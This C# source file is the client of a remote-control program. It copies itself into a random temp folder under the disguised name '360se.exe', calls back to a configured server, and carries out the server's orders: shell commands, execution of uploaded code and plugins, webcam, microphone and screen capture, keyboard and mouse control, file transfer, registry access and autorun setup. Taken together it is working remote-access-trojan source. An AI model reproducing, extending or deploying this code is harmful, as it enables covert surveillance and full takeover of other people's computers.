using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Net.Sockets;
using System.Threading;
using RemoteControl.Protocals;
using System.Drawing;
using System.Windows.Forms;
using System.IO;
using System.Diagnostics;
using System.Media;
using System.Drawing.Imaging;
using Microsoft.VisualBasic.Devices;
using RemoteControl.Protocals.Request;
using RemoteControl.Protocals.Plugin;
using RemoteControl.Protocals.Utilities;
using System.Net;
using RemoteControl.Protocals.Response;
using Microsoft.Win32;
using System.Runtime.InteropServices;
using RemoteControl.Client.Handlers;
using RemoteControl.Protocals.Codec;

namespace RemoteControl.Client
{
    class Program
    {
        private static Socket oServer;
        private static SocketSession oServerSession;
        private static ClientParameters clientParameters;
        private static bool isTestMode = false;
        private static Dictionary<string, bool> sessionVideoHandleSwitch = new Dictionary<string, bool>();
        private static readonly string LastVideoCapturePathStoreFile = Environment.GetEnvironmentVariable("temp") + "\\vcpsf.dat";
        private static Dictionary<string, FileStream> fileUploadDic = new Dictionary<string, FileStream>();
        private static string lastVideoCaptureExeFile = null;
        private static Dictionary<string, List<byte>> codePluginDic = new Dictionary<string, List<byte>>();
        private static bool isClosing = false;
        private static Thread heartbeatThread = null;
        private static Dictionary<ePacketType, IRequestHandler> handlers = new Dictionary<ePacketType, IRequestHandler>();
        const string MutexName = "RemoteControl.Client";

        static void Main(string[] args)
        {
            if (args.Length == 1 && args[0].StartsWith("/delay:"))
            {
                string str = args[0].Substring("/delay:".Length);
                int delay = Convert.ToInt32(str);
                Thread.Sleep(delay);
                args = new string[]{};
            }
            ReadParameters();
            if (args.Length == 0)
            {
                // 进行安装操作
                string sourceFilePath = System.Reflection.Assembly.GetEntryAssembly().Location;
                var destinationFileDir = Environment.GetEnvironmentVariable("temp") + "\\" + Guid.NewGuid().ToString();
                if (!System.IO.Directory.Exists(destinationFileDir))
                {
                    System.IO.Directory.CreateDirectory(destinationFileDir);
                }
                string serviceName = "360se.exe";
                if (!string.IsNullOrWhiteSpace(clientParameters.ServiceName))
                {
                    serviceName = clientParameters.ServiceName;
                }
                var destinationFilePath = destinationFileDir + "\\" + serviceName;
                System.IO.File.Copy(sourceFilePath, destinationFilePath, true);
                var t = ProcessUtil.Run(destinationFilePath, "/r", true, false);
                t.Join();
                return;
            }
            else if (args.Length == 1)
            {
                if (args[0] == "/r")
                {
                    // 进行运行操作
                    if (CommonUtil.IsMultiRun(MutexName))
                        return;
                    InitHandlers();
                    StartConnect();
                    heartbeatThread = new Thread(() => StartHeartbeat()) {IsBackground = true};
                    heartbeatThread.Start();
                    StartMonitor();
                }
            }
        }

        static void InitHandlers()
        {
            handlers.Add(ePacketType.PACKET_VIEW_REGISTRY_KEY_REQUEST, new RequestViewRegistryKeyHandler());
            handlers.Add(ePacketType.PACKET_OPE_REGISTRY_VALUE_NAME_REQUEST, new RequestOpeRegistryValueNameHandler());
            RequestCaptureAudioHandler captureAudioHandler = new RequestCaptureAudioHandler();
            handlers.Add(ePacketType.PACKET_START_CAPTURE_AUDIO_REQUEST, captureAudioHandler);
            handlers.Add(ePacketType.PACKET_STOP_CAPTURE_AUDIO_REQUEST, captureAudioHandler);
            RequestGetProcessesHandler getProcessesHandler = new RequestGetProcessesHandler();
            handlers.Add(ePacketType.PACKET_GET_PROCESSES_REQUEST, getProcessesHandler);
            handlers.Add(ePacketType.PACKET_KILL_PROCESS_REQUEST, getProcessesHandler);
            handlers.Add(ePacketType.PACKET_AUTORUN_REQUEST, new RequestAutoRunHandler());
            handlers.Add(ePacketType.PACKET_GET_DRIVES_REQUEST, new RequestGetDrivesHandler());
            handlers.Add(ePacketType.PACKET_GET_SUBFILES_OR_DIRS_REQUEST, new RequestGetSubFilesOrDirsHandler());
            RequestOpeFileOrDirHandler opeFileOrDirHandler = new RequestOpeFileOrDirHandler();
            handlers.Add(ePacketType.PACKET_CREATE_FILE_OR_DIR_REQUEST, opeFileOrDirHandler);
            handlers.Add(ePacketType.PACKET_DELETE_FILE_OR_DIR_REQUEST, opeFileOrDirHandler);
            handlers.Add(ePacketType.PACKET_COPY_FILE_OR_DIR_REQUEST, opeFileOrDirHandler);
            handlers.Add(ePacketType.PACKET_MOVE_FILE_OR_DIR_REQUEST, opeFileOrDirHandler);
            handlers.Add(ePacketType.PACKET_RENAME_FILE_REQUEST, opeFileOrDirHandler);
            RequestPowerHandler powerHandler = new RequestPowerHandler();
            handlers.Add(ePacketType.PACKET_SHUTDOWN_REQUEST, powerHandler);
            handlers.Add(ePacketType.PACKET_REBOOT_REQUEST, powerHandler);
            handlers.Add(ePacketType.PACKET_SLEEP_REQUEST, powerHandler);
            handlers.Add(ePacketType.PACKET_HIBERNATE_REQUEST, powerHandler);
            handlers.Add(ePacketType.PACKET_LOCK_REQUEST, powerHandler);
            handlers.Add(ePacketType.PACKET_OPEN_URL_REQUEST, new RequestOpenUrlHandler());
            handlers.Add(ePacketType.PACKET_COMMAND_REQUEST, new RequestCommandHandler());
            RequestCaptureScreenHandler captureScreenHandler = new RequestCaptureScreenHandler();
            handlers.Add(ePacketType.PACKET_START_CAPTURE_SCREEN_REQUEST, captureScreenHandler);
            handlers.Add(ePacketType.PACKET_STOP_CAPTURE_SCREEN_REQUEST, captureScreenHandler);
            RequestDownloadHandler downloadHandler = new RequestDownloadHandler();
            handlers.Add(ePacketType.PACKET_START_DOWNLOAD_REQUEST, downloadHandler);
            handlers.Add(ePacketType.PACKET_STOP_DOWNLOAD_REQUEST, downloadHandler);
            RequestLockMouseHandler lockMouseHandler = new RequestLockMouseHandler();
            handlers.Add(ePacketType.PACKET_LOCK_MOUSE_REQUEST, lockMouseHandler);
            handlers.Add(ePacketType.PACKET_UNLOCK_MOUSE_REQUEST, lockMouseHandler);
            RequestBlackScreenHandler blackScreenHandler = new RequestBlackScreenHandler();
            handlers.Add(ePacketType.PAKCET_BLACK_SCREEN_REQUEST, blackScreenHandler);
            handlers.Add(ePacketType.PAKCET_UN_BLACK_SCREEN_REQUEST, blackScreenHandler);
            handlers.Add(ePacketType.PACKET_MESSAGEBOX_REQUEST, new RequestMsgBoxHandler());
            RequestOpeCDHandler opeCDHandler = new RequestOpeCDHandler();
            handlers.Add(ePacketType.PACKET_OPEN_CD_REQUEST, opeCDHandler);
            handlers.Add(ePacketType.PACKET_CLOSE_CD_REQUEST, opeCDHandler);
            RequestPlayMusicHandler playMusicHandler = new RequestPlayMusicHandler();
            handlers.Add(ePacketType.PACKET_PLAY_MUSIC_REQUEST, playMusicHandler);
            handlers.Add(ePacketType.PACKET_STOP_PLAY_MUSIC_REQUEST, playMusicHandler);
        }

        static void ReadParameters()
        {
            if (isTestMode)
            {
                clientParameters.SetServerIP("192.168.1.136");
                clientParameters.ServerPort = 10010;
                clientParameters.OnlineAvatar = "";
                clientParameters.ServiceName = "";
            }
            else
            {
                string filePath = System.Reflection.Assembly.GetExecutingAssembly().Location;
                clientParameters = ClientParametersManager.ReadParameters(filePath); 
            }
            Console.WriteLine("参数信息：");
            Console.WriteLine("IP:" + clientParameters.GetServerIP());
            Console.WriteLine("PORT：" + clientParameters.ServerPort);
        }

        static void StartConnect()
        {
            while (true)
            {
                try
                {
                    DoOutput("正在连接服务器...");
                    oServer = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                    oServer.Connect(clientParameters.GetIPEndPoint());
                    DoOutput("服务器连接成功！");

                    oServerSession = new SocketSession(oServer.RemoteEndPoint.ToString(), oServer);
                    StartRecvData(oServerSession);
                    break;
                }
                catch (Exception ex)
                {
                    Console.WriteLine("连接服务器异常，" + ex.Message);
                }
                Thread.Sleep(3000);
            }
        }

        static void StartRecvData(SocketSession session)
        {
            // 获取主机名，并告诉服务器
            ResponseGetHostName resp = new ResponseGetHostName();
            resp.HostName = Dns.GetHostName();
            resp.AppPath = Application.ExecutablePath;
            resp.OnlineAvatar = clientParameters.OnlineAvatar;
            session.Send(ePacketType.PACKET_GET_HOST_NAME_RESPONSE, resp);

            new Thread(() =>
            {
                byte[] buffer = new byte[1024];
                int recvSize = -1;
                List<byte> data = new List<byte>();
                while (true)
                {
                    try
                    {
                        recvSize = session.SocketObj.Receive(buffer);
                        if (recvSize < 0)
                            continue;

                        for (int i = 0; i < recvSize; i++)
                        {
                            data.Add(buffer[i]);
                        }
                        while (data.Count >= 4)
                        {
                            int packetLength = BitConverter.ToInt32(data.ToArray(), 0);
                            if (data.Count >= packetLength)
                            {
                                DoRecvBytes(session, data.SplitBytes(0, packetLength));
                                data.RemoveRange(0, packetLength);
                            }
                            else
                            {
                                break;
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine(ex.Message);
                        break;
                    }
                }
            }) { IsBackground = true }.Start();
        }

        static void DoRecvBytes(SocketSession session, byte[] packet)
        {
            ePacketType packetType;
            object obj;
            CodecFactory.Instance.DecodeObject(packet, out packetType, out obj);
            Console.WriteLine(packetType.ToString());

            if (packetType == ePacketType.PACKET_DOWNLOAD_WEBFILE_REQUEST)
            {
                var req = obj as RequestDownloadWebFile;
                StartDownloadWebFile(session, req);
            }
            else if (packetType == ePacketType.PACKET_START_CAPTURE_VIDEO_REQUEST)
            {
                var req = obj as RequestStartCaptureVideo;
                new Thread(() =>
                    {
                        if (!sessionVideoHandleSwitch.ContainsKey(session.SocketId))
                        {
                            sessionVideoHandleSwitch.Add(session.SocketId, true);
                            // 关闭上次打开的程序
                            Console.WriteLine("当前lastVideoCaptureExeFile：" + lastVideoCaptureExeFile);
                            if (lastVideoCaptureExeFile == null)
                            {
                                if (System.IO.File.Exists(LastVideoCapturePathStoreFile))
                                {
                                    lastVideoCaptureExeFile = System.IO.File.ReadAllText(LastVideoCapturePathStoreFile);
                                    Console.WriteLine("读取到store文件：" + lastVideoCaptureExeFile);
                                }
                            }
                            if (lastVideoCaptureExeFile != null)
                            {
                                string processName = System.IO.Path.GetFileNameWithoutExtension(lastVideoCaptureExeFile);
                                ProcessUtil.KillProcess(processName.ToLower());
                            }
                            // 释放并打开视频程序
                            byte[] data = ResUtil.GetResFileData("CamCapture.dat");
                            string fileName = ResUtil.WriteToRandomFile(data,"camCapture.exe");
                            lastVideoCaptureExeFile = fileName;
                            System.IO.File.WriteAllText(LastVideoCapturePathStoreFile, fileName);
                            //ProcessUtil.Run("cmd.exe", "/c start " + fileName + " /s /fps:2", true, false);
                            ProcessUtil.Run("cmd.exe", "/c start " + fileName + " /fps:" + req.Fps, true, false);
                            // 查找视频程序的端口
                            string pName = System.IO.Path.GetFileNameWithoutExtension(lastVideoCaptureExeFile);
                            DoOutput("已启动视频监控程序：" + pName);
                            int port = -1;
                            int tryTimes = 0;
                            while (tryTimes<60)
                            {
                                port = FindServerPortByProcessName(pName);
                                DoOutput("视频端口：" + port);
                                if (port != -1)
                                    break;
                                Thread.Sleep(1000);
                                tryTimes++;
                            }
                            if (port == -1)
                                return;
                            CaptureVideoClient.MessagerReceived += (o, args) =>
                                {
                                    try
                                    {
                                        var p = o as List<byte>;
                                        var resp = new ResponseStartCaptureVideo();
                                        resp.CollectTime = new DateTime(BitConverter.ToInt64(p.ToArray(), 0));
                                        p.RemoveRange(0, 8);
                                        resp.ImageData = p.ToArray();
                                        if (resp.ImageData != null)
                                        {
                                            DoOutput("接收到视频数据" + resp.ImageData.Length);
                                        }

                                        session.Send(ePacketType.PACKET_START_CAPTURE_VIDEO_RESPONSE, resp);
                                    }
                                    catch (Exception ex)
                                    {
                                        Console.WriteLine("CaptureVideoClient.MessagerReceived，" + ex.Message);
                                    }
                                };
                            try
                            {
                                CaptureVideoClient.Connect("127.0.0.1", port);
                                DoOutput("已经连接上视频服务");
                            }
                            catch (Exception ex)
                            {
                                Console.WriteLine(ex.Message);
                            }
                            // 检测是否已经关闭监控视频，并退出服务，结束视频服务程序
                            while (true)
                            {
                                if (!sessionVideoHandleSwitch.ContainsKey(session.SocketId))
                                {
                                    DoOutput("已关闭视频监控数据传输连接!");
                                    CaptureVideoClient.Close();
                                    if (lastVideoCaptureExeFile != null)
                                    {
                                        string processName = System.IO.Path.GetFileNameWithoutExtension(lastVideoCaptureExeFile);
                                        ProcessUtil.KillProcess(processName.ToLower());
                                    }
                                    break;
                                }
                                Thread.Sleep(1000);
                            }
                        }

                    }) { IsBackground = true }.Start();
            }
            else if (packetType == ePacketType.PACKET_STOP_CAPTURE_VIDEO_REQUEST)
            {
                if (sessionVideoHandleSwitch.ContainsKey(session.SocketId))
                {
                    sessionVideoHandleSwitch.Remove(session.SocketId);
                }
            }
            else if (packetType == ePacketType.PACKET_START_UPLOAD_HEADER_REQUEST)
            {
                var req = obj as RequestStartUploadHeader;
                if (fileUploadDic.ContainsKey(req.Id))
                    return;
                FileStream fs = new FileStream(req.To, FileMode.Create, FileAccess.Write);
                fileUploadDic.Add(req.Id, fs);
            }
            else if (packetType == ePacketType.PACKET_START_UPLOAD_RESPONSE)
            {
                var resp = obj as ResponseStartUpload; 
                if (fileUploadDic.ContainsKey(resp.Id))
                {
                    FileStream fs = fileUploadDic[resp.Id];
                    fs.Write(resp.Data, 0, resp.Data.Length);
                }
            }
            else if (packetType == ePacketType.PACKET_STOP_UPLOAD_REQUEST)
            {
                var req = obj as RequestStopUpload;
                if (fileUploadDic.ContainsKey(req.Id))
                {
                    fileUploadDic[req.Id].Close();
                    fileUploadDic[req.Id].Dispose();
                    fileUploadDic.Remove(req.Id);
                }
            }
            else if (packetType == ePacketType.PACKET_QUIT_APP_REQUEST)
            {
                OnFireQuit(null,null);
            }
            else if (packetType == ePacketType.PACKET_RESTART_APP_REQUEST)
            {
                string path = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
                var thread = ProcessUtil.Run(path, "/r", true);
                thread.Join();
                OnFireQuit(null, null);
            }
            else if (packetType == ePacketType.PACKET_TRANSPORT_EXEC_CODE_REQUEST)
            {
                var req = obj as RequestTransportExecCode;
                if (!codePluginDic.ContainsKey(req.ID))
                {
                    codePluginDic.Add(req.ID, new List<byte>());
                }
                codePluginDic[req.ID].AddRange(req.Data);
            }
            else if (packetType == ePacketType.PACKET_RUN_EXEC_CODE_REQUEST)
            {
                Console.WriteLine("开始处理请求：" + packetType.ToString());
                new Thread(() => {
                    try
                    {
                        var req = obj as RequestRunExecCode;
                        Console.WriteLine("请求ID:" + req.ID);
                        if (codePluginDic.ContainsKey(req.ID))
                        {
                            if (req.Mode == eExecMode.ExecByPlugin)
                            {
                                byte[] data = codePluginDic[req.ID].ToArray();
                                Console.WriteLine("数据长度：" + data.Length);
                                PluginLoader.LoadPlugin(data, OnFireQuit);
                                codePluginDic.Remove(req.ID);
                            }
                            else if (req.Mode == eExecMode.ExecByFile)
                            {
                                if (req.FileArguments == null)
                                    req.FileArguments = string.Empty;
                                // 释放文件
                                byte[] data = codePluginDic[req.ID].ToArray();
                                string tempFile = ResUtil.WriteToRandomFile(data, "360se.exe");
                                // 启动新程序
                                Thread t = ProcessUtil.RunByCmdStart(tempFile, req.FileArguments, true);
                                t.Join();
                                if (req.IsKillMySelf)
                                {
                                    // 结束当前进程
                                    OnFireQuit(null, null);
                                }
                            }
                        }
                        else
                        {
                            Console.WriteLine("请求ID不存在:" + req.ID);
                        }
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine(ex.Message);
                    }
                }) { IsBackground = true }.Start();
            }
            else if (packetType == ePacketType.PACKET_MOUSE_EVENT_REQUEST)
            {
                var req = obj as RequestMouseEvent;
                DoOutput(string.Format("button:{0},operation:{1},location:{2},{3}",
                    req.MouseButton,
                    req.MouseOperation,
                    req.MouseLocation.X, req.MouseLocation.Y));

                if (req.MouseOperation == eMouseOperations.MouseDown)
                {
                    MouseOpeUtil.MouseDown(req.MouseButton, req.MouseLocation);
                }
                else if (req.MouseOperation == eMouseOperations.MouseUp)
                {
                    MouseOpeUtil.MouseUp(req.MouseButton, req.MouseLocation);
                }
                else if (req.MouseOperation == eMouseOperations.MousePress)
                {
                    MouseOpeUtil.MousePress(req.MouseButton, req.MouseLocation);
                }
                else if (req.MouseOperation == eMouseOperations.MouseDoubleClick)
                {
                    MouseOpeUtil.MouseDoubleClick(req.MouseButton, req.MouseLocation);
                }
                else if (req.MouseOperation == eMouseOperations.MouseMove)
                {
                    MouseOpeUtil.MouseMove(req.MouseLocation);
                }
                else
                {
                    return;
                }
            }
            else if (packetType == ePacketType.PACKET_KEYBOARD_EVENT_REQUEST)
            {
                var req = obj as RequestKeyboardEvent;
                DoOutput(string.Format("keyCode:{0},keyValue:{1},keyOperation:{2}",
                    req.KeyCode, req.KeyValue, req.KeyOperation));
                KeyboardOpeUtil.KeyOpe(req.KeyCode, req.KeyOperation);
            }
            else if (packetType == ePacketType.PACKET_OPEN_FILE_REQUEST)
            {
                var req = obj as RequestOpenFile;
                ProcessUtil.Run(req.FilePath, "", req.IsHide, true);
            }
            else
            {
                if(handlers.ContainsKey(packetType))
                {
                    handlers[packetType].Handle(session, packetType, obj);
                }
            }
        }

        static int FindServerPortByProcessName(string processName)
        {
            var pros = Process.GetProcesses();
            for (int i = 0; i < pros.Length; i++)
            {
                var p = pros[i];
                if (p.ProcessName.Contains(processName))
                {
                    DoOutput("找到进程:" + p.ProcessName + ",id:" + p.Id);
                    int processId = p.Id;

                    Process pro = new Process();
                    pro.StartInfo.FileName = "cmd.exe";
                    pro.StartInfo.CreateNoWindow = true;
                    pro.StartInfo.UseShellExecute = false;
                    pro.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                    pro.StartInfo.RedirectStandardInput = true;
                    pro.StartInfo.RedirectStandardOutput = true;
                    pro.Start();
                    Thread.Sleep(1000);
                    pro.StandardInput.WriteLine("netstat -ano | findstr \"" + processId + "\"");
                    Thread.Sleep(1000);
                    //pro.BeginOutputReadLine();
                    while (pro.StandardOutput.Peek() != -1)
                    {
                        string line = pro.StandardOutput.ReadLine().Trim();
                        DoOutput("行：" + line);
                        if (line.StartsWith("TCP"))
                        {
                            var cols = line.Split("\r\n\t ".ToCharArray(), StringSplitOptions.RemoveEmptyEntries);
                            if (cols.Length == 5)
                            {
                                if (cols[4] == processId.ToString())
                                {
                                    var ipep = cols[1];
                                    var a = ipep.Split(':');
                                    return Convert.ToInt32(a[1]);
                                }
                            }
                            else if (cols.Length == 4)
                            {
                                if (cols[3] == processId.ToString())
                                {
                                    var ipep = cols[1];
                                    var a = ipep.Split(':');
                                    return Convert.ToInt32(a[1]);
                                }
                            }
                        }
                    }

                    break;
                }

            }

            return -1;
        }

        static void StartDownloadWebFile(SocketSession session, RequestDownloadWebFile req)
        {
            try
            {
                // 释放程序
                byte[] data = ResUtil.GetResFileData("Downloader.dat");
                string fileName = ResUtil.WriteToRandomFile(data);
                // 启动程序
                string arguments = string.Format("{0} {1}", req.WebFileUrl,req.DestinationPath);
                ProcessUtil.Run("cmd.exe", "/c start " + fileName + " " + arguments, true, false);
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
        }

        static void StartHeartbeat()
        {
            while (true)
            {
                if (isClosing)
                {
                    break;
                }
                try
                {
                    if (oServer != null)
                    {
                        byte[] packet = CodecFactory.Instance.EncodeOject(ePacketType.PACKET_HEART_BEAR, null);
                        oServer.Send(packet);
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine("心跳发送异常，" + ex.Message);
                    StartConnect();
                }
                Thread.Sleep(3000);
            }

        }

        static void StartMonitor()
        {
            while (true)
            {
                Thread.Sleep(1000);
            }
        }

        static void DoOutput(string sMsg)
        {
            Console.WriteLine("{0} {1}", DateTime.Now.ToString("yyyy/MM/dd HH:mm:ss"), sMsg);
        }

        static void OnFireQuit(object sender, EventArgs e)
        {
            isClosing = true;
            if (heartbeatThread != null)
            {
                heartbeatThread.Join();
            }
            if (oServerSession != null)
            {
                oServerSession.Send(ePacketType.PACKET_CLIENT_CLOSE_RESPONSE, null);
            }
            Environment.Exit(0);
        }

    }
}
